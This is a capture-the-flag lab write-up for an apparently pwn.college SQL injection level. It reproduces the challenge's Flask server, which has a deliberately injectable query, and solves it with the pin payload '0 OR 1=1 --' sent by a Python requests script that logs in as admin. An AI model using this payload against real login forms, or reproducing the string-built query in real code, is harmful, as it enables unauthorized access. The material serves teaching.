## Exercise
Of course, these sorts of security gaps abound! For example, in this level, the specification of the logged in user is actually secure. Instead of get parameters or raw cookies, this level uses an encrypted session cookie that you will not be able to mess with. Thus, your task is to get the application to actually authenticate you as admin!

Luckily, as the name of the level suggests, this application is vulnerable to a _SQL injection_. A SQL injection, conceptually, is to SQL what a Command Injection is to the shell. In Command Injections, the application assembled a command string, and a gap between the developer's intent and the command shell's actual functionality enabled attackers to carry out actions unintended by the developer. A SQL injection is the same: the developer builds the application to make SQL queries for certain goals, but because of the way these queries are assembled by the application logic, the resulting actions of the SQL query, when executed by the database, can be disastrous from a security perspective.

Command injections don't have a clear solution: the shell is an ancient piece of technology, and the interfaces to the shell have ossified decades ago and are very hard to change. SQL is somewhat more nimble, and most databases now provide interfaces that are very resistant to being SQL-injectible. In fact, the authentication bypass levels used such interfaces: they are very vulnerable, but _not_ to SQL injection.

This level, on the other hand, _is_ SQL injectible, as it purposefully uses a slightly different way to make SQL queries. When you find the SQL query into which you can inject your input (hint: it is the only SQL query to substantially differ between this level and the previous level), look at what the query looks like right now, and what unintended conditions you might inject. The quintessential SQL injection adds a condition so that an application can succeed without knowing the password. How can you accomplish this?

## Solution
First things first. Let's check out the server files and permissions:
```
> ls -la /
-r--------    1 root root   60 Sep  2 10:25 flag
drwxr-xr-x    1 root root 4096 Sep  2 10:25 challenge

> ls -la /challenge/
-rwsr-xr-x 1 root root 1990 Jan  9  2026 DESCRIPTION.md
-rwsr-xr-x 1 root root 2464 Sep  6  2025 server
```
We are allowed to read and execute the files in /challenge/.
Therefore let's take a look at /challenge/server.
```
> cat /challenge/server

#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import random
import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as pin""", [random.randrange(2**32, 2**63)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, 1337 as pin""")


@app.route("/authentication", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("user-handle")
    pin = flask.request.form.get("pin")
    if not username:
        flask.abort(400, "Missing `user-handle` form parameter")
    if not pin:
        flask.abort(400, "Missing `pin` form parameter")

    if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or pin")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/authentication", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return (
        page
        + """
        <hr>
        <form method=post>
        User:<input type=text name=user-handle>Pin:<input type=text name=pin><input type=submit value=Submit>
        </form>
        </body></html>
    """
    )


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
The server creates a database with a users table. There are 2 entries:
```
users:
username | pin
---------|-----------
guest    | "1337"
admin    | ?
```
The server accepts GET and POST requests on /authentication.
POST is for user login and authentication.
GET returns us the flag if we are in a valid admin session. Therefore we need to login into the server. Let's try this with injection.
### Injection
Because we need to login to the server as the admin user without knowing the password, we will try to inject sql code to the password validation with the goal to bypass the password.
The authentication process in the server:
```
if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
```
It checks if the first value of the pin is a number from 0-9 as a security measure. Afterwards it authenticates the user:
```
SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }
```
Our inject:
```
SELECT rowid, * FROM users WHERE username = '{username}' AND pin = 0 OR 1=1 -- }
```
This bypasses the first security measure because the first value of our password string is 0. Afterwards we trick the server with a true statement because 1=1 is always true. The -- is to comment out the rest because we don't want any errors.
Our pin:
```
0 OR 1=1 --
```
Let's send the server the POST request. I like to use python this time:
```
> cat sqlinject.py

import requests as req

url = "http://challenge.localhost:80/authentication"
data = {
        "user-handle": "admin",
        "pin": "0 OR 1=1 --"
}
x = req.post(url, data)
print(x.text)

> python sqlinject.py

DEBUG: query="SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1 --"
127.0.0.1 - - [02/Sep/2026 11:08:55] "POST /authentication HTTP/1.1" 302 -
127.0.0.1 - - [02/Sep/2026 11:08:55] "GET /authentication HTTP/1.1" 200 -
<html><body>Hello, admin!<br>Here is your flag: pwn.college{[REDACTED FLAG]}

        <hr>
        <form method=post>
        User:<input type=text name=user-handle>Pin:<input type=text name=pin><input type=submit value=Submit>
        </form>
        </body></html>
```
And we got our flag.